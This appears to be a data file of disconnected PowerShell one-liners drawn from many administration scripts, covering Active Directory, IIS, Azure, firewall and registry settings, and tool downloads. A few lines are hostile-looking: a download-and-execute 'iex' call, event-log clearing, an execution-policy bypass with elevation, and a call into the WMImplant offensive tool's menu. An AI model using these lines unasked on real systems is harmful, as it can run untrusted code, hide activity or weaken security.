ForEach-Object { [ Version ] ( $_ | ConnectorVer ) } | # Parse it's version using the filter
Sort-Object -Descending | Select-Object -First 1 # Sort then select only the latest
Remove-Module TweakList -ErrorAction Ignore
Get-Menu $Entries
Get-Page
Update-Entry ( $lineSelected + 1 )
Update-Entry ( $lineSelected - 1 )
Update-Entry 0
Update-Entry ( $pageEntryTotal - 1 )
Out-Keys $InputObject [ $i ] ` @parameters ` -Delimiter $delimiter ` -MyInvocation $MyInvocation
Set-Content -Path "$LCDirectory\settings\game\profile_manager.json" -Value ( $Manager | ConvertTo-Json -Compress -Depth 99 )
Set-Variable -Scope Global -Name $file -Value ( Get-Content "$ProfileDir\$file.json" -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop )
Add-Content $OutFile @" $iadsName`:setupSAMSitesAndThenActivate() end "@
Read-Host -Prompt "Press any key to exit..."
Get-ChildItem "$(config_home)/update/update-run-first" | ForEach-Object {
x="$(config_home)/update/update-first" && [ -d "$x" ] && dot_all "$x"
Out-File -FilePath $scriptPath -InputObject $scriptBlock
Remove-Item -Path "$runID.ps1"
Start-Process -FilePath "pwsh.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
Add-Content -Path $logFilePath -Value $logContent
Get-ChildItem -Path "$SoftwarePath" -Recurse |
Configure-Azure -Credential $AzureOrgIdCredential -SubscriptionName $AzureSubscriptionName -CurrentStorageAccountName $StorageAccountName
Set-AzureVMCustomScriptExtensionHelper -VMName $ProxyVmName -ServiceName $ProxyServiceName -ContainerName $ContainerName -FileName $FileName -Run $FileName -Argument $ArgumentList
Clean-Up -ContainerName $ContainerName -ScriptFileName $FileName
Get-command -Module grouppolicy
Get-GPOReport -All -Domain xyz.com
Restore-GPO -Name "GPOname" -Path \\Server1\Backups
Backup-Gpo -All -Path \\Server1\GpoBackups
Get-DfsReplicationGroup -GroupName RG02
Restart-computer -computername A , B , C
Get-service
New-ADGroup -Name $groupName -Path $groupPath -GroupScope Global -PassThru
New-ADGroup -Name $group . GroupName -SamAccountName $group . GroupName -GroupScope Global -PassThru
New-ADGroup -Name $group . GroupName -Path $group . GroupPath -GroupScope Global -PassThru
New-ADUser -Name $fullName -GivenName $firstName -Surname $lastName -UserPrincipalName $upn -DisplayName $displayName -OfficePhone $officeNumber -EmailAddress $email -AccountPassword $password -Enabled $true -Path $path -PassThru
Set-ADUser $user -Displayname 'new DN' -SamAccountName 'new sAMAccountName' -server 'server' -ErrorAction SilentlyContinue
Rename-ADObject -Identity $user -Newname 'new DN' -server 'server'
Start-Sleep 60
Set-AzVMDiskEncryptionExtension -ResourceGroupName $vmrg -VMName $vm -DiskEncryptionKeyVaultUrl $localvaultdetails . VaultUri -DiskEncryptionKeyVaultId $localvaultdetails . ResourceId -VolumeType All -SkipVmBackup -Force
Get-ChildItem -Path "$($env:Build_ArtifactStagingDirectory)\Vagrantey" -Recurse
Import-Module "$($env:Build_ArtifactStagingDirectory)\Vagrantey\Vagrantey.psd1"
Set-PowerCLIConfiguration -DefaultVIServerMode single -scope session -Confirm: $false | Out-Null
Export-ModuleMember -Function VConnect-AddPSSnapIn
Add-Type -Assembly PresentationCore
New-TextBlock -FontSize 14 -FontWeight SemiBold -Text "How to download"
New-Window -ControlName 'MainWindow' -Title 'VideoDL' -Background '#FFF5F5F5' -Height 580 -Width 712 -MinHeight 580 -MinWidth 712 -WindowStartupLocation CenterScreen -FontFamily "Segoe UI" -FontSize 11.5 -UseLayoutRounding -On_Initialized { Arguments ; $RichTextBoxURLs . Document . Blocks . FirstBlock . Margin = 0 ; Load_Text } -On_Closing { Stop ; Save_Text } {
Test-Configuration -ConfigFile $ConfigFile
Set-Clipboard $resultsForClipboard
Set-ExecutionPolicy -Scope CurrentUser Unrestricted
New-AzureStorageContainer -Name $StorageContainerName -Context $StorageAccount . Context -ErrorAction SilentlyContinue *>&1
Initialize-AVSSite
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Add-LocalGroupMember -Group "Administrators" -Member "svc-vra-iaas"
New-NetFirewallRule -DisplayName "Microsoft SQL Server 2016 - SQL - TCP" -Direction Inbound -LocalPort 1433 -Protocol TCP -Action Allow
Enable-NetFirewallRule -DisplayName "Distributed Transaction Coordinator (RPC-EPMAP)"
Enable-NetFirewallRule -DisplayName "Distributed Transaction Coordinator (TCP-In)"
Enable-NetFirewallRule -DisplayName "Distributed Transaction Coordinator (TCP-Out)"
C:\Temp\SSMS-Setup-ENU.exe /install /passive /norestart
B:\Setup.exe /ConfigurationFile="C:\Temp\Microsoft SQL Server 2016 - Configuration.ini"
Set-DtcNetworkSetting -DtcName "Local" -RemoteClientAccessEnabled: $true -RemoteAdministrationAccessEnabled: $false -AuthenticationLevel "Mutual" -InboundTransactionsEnabled: $true -OutboundTransactionsEnabled: $true -XATransactionsEnabled: $false -LUTransactionsEnabled: $true -Confirm: $false
Set-Variable -Name "projectStructure" -Value $xml -Scope "script" -Option ReadOnly
Install-Vsix $installableExtension . PackagePath
remove-item function:deactivate
copy-item env:PATH env:_OLD_VIRTUAL_PATH
New-Object psobject -Property @{
Start-NcDiskZeroSpare
Get-WFALogger -Info -message $( "Sending email to " + $To )
Move-Item $site [ 0 ] . FullName $sitesavailable . FullName
New-WebBinding -Name $InfoServer1 . name -Port 80 -Protocol http
Set-Acl $path $folder
Get-Command -Module WebAdministration -Noun '*website*' | Format-Table -AutoSize
Import-Module ServerManager
Get-WindowsFeature -Name web*
Add-WindowsFeature -Name Web-Static-Content , Web-Dir-Browsing , Web-Http-Errors , Web-Http-Redirect , Web-Asp-Net , Web-CGI , Web-Windows-Auth , Web-Filtering , Web-Performance , Web-Mgmt-Tools , Web-Ftp-Service , Web-Dyn-Compression , Web-Scripting-Tools , Web-Mgmt-Service , Web-Http-Logging , Web-Log-Libraries , Web-Request-Monitor , Web-Http-Tracing
Add-WindowsFeature -Name PowerShell-ISE , FS-FileServer , RSAT-FSRM-Mgmt -Restart
Set-ExecutionPolicy RemoteSigned �Force
Set-Service -Name aspnet_state -StartupType Automatic
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\FIPSAlgorithmPolicy" -name Enabled -value 0
Set-ExecutionPolicy Bypass -Scope Process -Force ; iex ( ( New-Object System.Net.WebClient ) . DownloadString ( 'https://chocolatey.org/install.ps1' ) )
sc.exe config SyncShareSvc start= delayed-auto
New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR | Out-Null
Get-CimInstance -Class CIM_LogicalDisk | Select-Object @{ Name = "Size(GB)" ; Expression = { $_ . size / 1gb } } , @{ Name = "Free Space(GB)" ; Expression = { $_ . freespace / 1gb } } , @{ Name = "Free (%)" ; Expression = { "{0,6:P0}" -f ( ( $_ . freespace / 1gb ) / ( $_ . size / 1gb ) ) } } , DeviceID , DriveType | Where-Object DriveType -EQ '3'
Get-CimInstance -Class CIM_LogicalDisk | Select-Object * | Where-Object DriveType -EQ '3'
Rename-Computer -NewName $computer_name
Set-ItemProperty -Path "HKCU:\Control Panel\International" -Name sShortDate -value $short_date
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
sc.exe config wuauserv start=disabled
Add-Computer -DomainName $domain -Credential $credential
Restart-Computer
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Add-Type -AssemblyName System.Windows.Forms
Start-Sleep -Seconds 2
Set-TimeZone -Id $TimeZoneID
Get-TimeZone
Install-Module Posh-Git -Force -AllowPrerelease
Get-ConsoleRegistryItem |
Get-CimInstance @CIM | Where-Object ConversionStatus -EQ 1 |
Get-Job -Id $Result . id | Wait-Job | Remove-Job
Start-Transcript -Path "C:\Logs\wt.log" -Append -IncludeInvocationHeader
Stop-Transcript
Start-Transcript -Path "C:\Logs\wt.log" -Append -IncludeInvocationHeader
Stop-Transcript
oh-my-posh init pwsh --config "$env:POSH_THEMES_PATH/sitecore.omp.json" | Invoke-Expression
Set-PSReadLineOption -Colors @{
Register-ArgumentCompleter -Native -CommandName "dotnet" -ScriptBlock {
Register-ArgumentCompleter -Native -CommandName "sitecore" -ScriptBlock {
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
Get-ChildItem WSMan:\Localhost\listener | Where-Object -Property Keys -eq "Transport=HTTP" | Remove-Item -Recurse
Set-Service -Name "WinRM" -StartupType Disabled -Status Stopped
Disable-NetFirewallRule -DisplayName “Windows Remote Management (HTTP-In)”
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" -Name "SearchOrderConfig" -Type DWord -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "IRPStackSize" -Type DWord -Value 20
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Feeds" -Name "ShellFeedsTaskbarViewMode" -Type DWord -Value 2
Set-StrictMode -Version Latest
Add-Type -AssemblyName System.IO.Compression.FileSystem
Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
Add-Type -AssemblyName System.Windows.Forms
show-console -hide
Get-ChildItem $tempFolder -Include *.* -File -Recurse | Remove-Item
Remove-Item "$appData\Microsoft\Windows\INetCache\*" -Recurse -Force
Clear-EventLog -LogName Application
Get-ChildItem $appData -Include *.* -File -Recurse | Where-Object { $_ . LastWriteTime -lt ( Get-Date ) . AddDays ( -30 ) } | Remove-Item
Get-Service Diagtrack , OneSyncSvc , XblAuthManager , XblGameSave , XboxNetApiSvc , WMPNetworkSvc -erroraction silentlycontinue | stop-service -passthru | set-service -startuptype disabled
Set-ItemProperty -Path $base2 -Name PausedQualityStatus -Value 1 -type DWord #dword 1 = on 0 = off
Remove-Item $downloadPath
Checkpoint-Computer -Description "$restorePointName" -RestorePointType "MODIFY_SETTINGS"
Get-NetTCPConnection |
Select-Object localaddress , localport , remoteaddress , State , #add object params here
Get-AppxPackage -AllUsers "Microsoft.AppConnector" | ForEach-Object { Add-AppxPackage -DisableDevelopmentMode -Register "$($_.InstallLocation)\AppXManifest.xml" }
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" -Name "DODownloadMode" -ErrorAction SilentlyContinue
Set-ItemProperty -Path "$($_.PsPath)\$($SoundScheme)" -Name "(Default)" -Type String -Value $Data
Set-ItemProperty -Path "$($_.PsPath)\.Current" -Name "(Default)" -Type String -Value $Data
Show-WMImplantMainMenu
Enable-PSRemoting -SkipNetworkProfileCheck -Force
Remove-Item -Path WSMan:\Localhost\listener\listener* -Recurse
New-Item -Path WSMan:\LocalHost\Listener -Transport HTTP -Address * -Force
New-NetFirewallRule -DisplayName "Windows Remote Management (HTTP-In)" -Name "Windows Remote Management (HTTPS-In)" -Profile Any -LocalPort 5985 -Protocol TCP
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
Enable-PSRemoting -SkipNetworkProfileCheck -Force
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
get-cmpackagedeploymentstatus -deploymentid $deploy | out-gridview
new-item "$Env:ProgramData\Microsoft\Windows\Start` Menu\Programs\Office` 2016" -type directory -force
copy-item $newdiritem -destination $newdest -Force
Invoke-Item -Path $Path
Import-Module -ea stop ( Join-Path ( Join-Path ( Join-Path $VisualStudioInstallPath Common7 ) Tools ) Microsoft.VisualStudio.DevShell.dll )
Enter-VsDevShell -VsInstallPath $VisualStudioInstallPath -SkipAutomaticLocation -DevCmdArguments "-arch=amd64 -host_arch=amd64"
New-Alias -Name vsdev -Value Enable-VisualStudioEnv
Start-Sleep $WaitTime
Remove-Item $tempFile
New-Item -ItemType file $output -force | Out-Null
Add-Content $output ( "## $afile" )
Add-Content $output ( Get-Content $fileInfo . FullName | Where { $_ -notmatch "^using module" } | Where { $_ } )
Add-Content $output "`n"
Copy-Item $Settings . ResourceFolder $Settings . ArchSourceFolder -Recurse -Force
Copy-Item "$($Settings.SourceFolder)/$($Settings.AppName).cmd" $Settings . ArchSourceFolder -Force
Set-ItemProperty -Path $WantedRegPath\ -Name DistributionName -Value "$newName" -ErrorAction Stop
Invoke-Expression $command
Add-Type -AssemblyName System.Windows.Forms
Invoke-Sqlcmd -query $createCustomIndexesSQLQuery -ServerInstance $serverInstance -QueryTimeout 120 -Encrypt Optional
Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
Start-IISCommitDelay
Stop-IISCommitDelay
Set-IISConfigAttributeValue -ConfigElement $wsusPoolConfig -AttributeName "queueLength" -AttributeValue $recommendedValue
Set-IISConfigAttributeValue -ConfigElement $wsusPoolFailureConfig -AttributeName "loadBalancerCapabilities" -AttributeValue $recommendedValue
Unblock-WebConfigAcl
Set-StrictMode -Version Latest
Ensure-AssemblyFileExistsWhereNuGetExpectsItToBe -ProjectFilePath $ProjectFilePath -OutputDirectory $OutputDirectory -Configuration $BuildConfiguration -Platform $BuildPlatform
Rename-Item -Path $nugetPackageFilePath -NewName $desiredNuGetPackageFilePath -Force
Rename-Item -Path $originalSymbolsNuGetPackageFilePath -NewName $desiredSymbolsNuGetPackageFilePath -Force
Add-Type -AssemblyName System.Windows.Forms
Update-NuSpecFile
Tfs-Undo -Path $NuSpecFilePath
New-Item $outputFileName -ItemType File -Force | Out-Null
Invoke-WebRequest -Uri https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip -OutFile .\ffmpeg.zip ;
Expand-Archive -LiteralPath ".\ffmpeg.zip" -DestinationPath ".\" ; # EXPAND ARCHIVE FFMPEG.EXE
Move-Item -Path .\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe -Destination .\ ; # TAKEOUT FFMPEG.EXE TO PATHABLE
Move-Item -Path .\ffmpeg-master-latest-win64-gpl\bin\ffprobe.exe -Destination .\ ; # TAKEOUT FFPROBE.EXE TO PATHABLE
Remove-Item ".\ffmpeg.zip" -Recurse -Force ; # DELETE THE ARCHIVE AFTER EXPANSION
Remove-Item ".\ffmpeg-master-latest-win64-gpl\" -Recurse -Force ; # REMOVE FFMPEG-MASTER DIRECTORY
Expand-Archive -LiteralPath "~\ffmpeg.zip" -DestinationPath "~\" ; # Expand archive ffmpeg
Remove-Item "~\ffmpeg.zip" -Recurse -Force ; # Delete Archive after expansion
Move-Item -Path C:\Users\haizi\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe -Destination ~\ ; # Move ffmpeg.exe to home dir
Remove-Item "~\ffmpeg-master-latest-win64-gpl\" -Recurse -Force ; # Remove item ffmpeg directory
Invoke-WebRequest -Uri https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe -OutFile ~\yt-dlp.exe ; # Now download yt-dlp executable
Remove-Item "~/ffmpeg.tar.xz" -Recurse -Force ; # Delete Archive after expansion
